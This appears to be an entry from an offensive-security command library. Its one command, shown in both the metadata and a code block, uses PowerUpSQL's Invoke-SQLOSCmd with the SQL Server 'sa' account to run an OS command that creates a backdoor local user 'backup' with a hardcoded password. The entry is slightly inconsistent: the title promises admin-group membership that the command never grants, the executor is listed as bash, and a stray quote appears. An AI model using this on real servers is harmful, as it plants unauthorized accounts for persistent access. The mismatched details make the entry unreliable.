---
id: d4dde36a-d108-46d4-a74c-3cb1eb0b00fa
name: Create and add local user backup to local administrators group
type: command
executor: bash
data: PowerUpSQL> Invoke-SQLOSCmd -Username sa -Password Password1234 -Instance "<DBSERVERNAME\DBInstance>"
  -Command "net user backup Password1234 /add'" -Verbose
output: null
created_at: '2023-04-06T03:56:20.234094+00:00'
updated_at: '2023-04-10T20:36:45.393785+00:00'
---

# Create and add local user backup to local administrators group

```bash
PowerUpSQL> Invoke-SQLOSCmd -Username sa -Password Password1234 -Instance "<DBSERVERNAME\DBInstance>" -Command "net user backup Password1234 /add'" -Verbose
```


